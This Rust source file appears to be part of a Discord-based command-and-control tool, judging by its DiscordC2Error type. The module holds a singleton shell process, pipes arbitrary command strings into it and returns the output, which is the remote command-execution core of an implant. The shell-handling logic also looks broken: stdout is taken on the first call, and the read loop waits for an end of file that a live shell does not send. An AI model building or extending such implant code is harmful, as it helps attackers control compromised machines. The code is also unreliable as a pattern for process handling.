use std::process::Stdio;
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;
use std::sync::Arc;
use tokio::sync::Mutex;
use crate::errors::DiscordC2Error;
use lazy_static::lazy_static;
use tokio::io::AsyncBufReadExt;

pub struct ProcessHandler {
    process: Arc<Mutex<tokio::process::Child>>,
}

lazy_static! {
    static ref PROCESS_HANDLER: Mutex<Option<Arc<ProcessHandler>>> = Mutex::new(None);
}

impl ProcessHandler {
    async fn new(shell_type: &str) -> Result<Self, DiscordC2Error> {
        let process = open_shell(shell_type).await?;
        Ok(ProcessHandler {
            process: Arc::new(Mutex::new(process)),
        })
    }

    pub async fn instance(shell_type: &str) -> Result<Arc<Self>, DiscordC2Error> {
        let mut process_handler = PROCESS_HANDLER.lock().await;
        if process_handler.is_none() {
            let instance = ProcessHandler::new(shell_type).await?;
            *process_handler = Some(Arc::new(instance));
        }
        Ok(process_handler.as_ref().unwrap().clone())
    }

    pub async fn run_command(&self, command: &str) -> Result<String, DiscordC2Error> {
        let mut process = self.process.lock().await;
        process.stdin.as_mut().unwrap().write_all(command.as_bytes()).await?;
        process.stdin.as_mut().unwrap().write_all(b"\n").await?;

        let mut buf_reader = BufReader::new(process.stdout.take().unwrap());
        let mut output = String::new();
        loop {
            let mut buf = String::new();
            let bytes_read = buf_reader.read_line(&mut buf).await?;
            if bytes_read == 0 {
                break;
            }

            output.push_str(&buf);
        }
        println!("output: {}", output);

        Ok(output)
    }
}

async fn open_shell(shell_type: &str) -> Result<tokio::process::Child, DiscordC2Error> {
    let child = Command::new(shell_type)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .map_err(|e| DiscordC2Error::from(e))?;

    Ok(child)
}
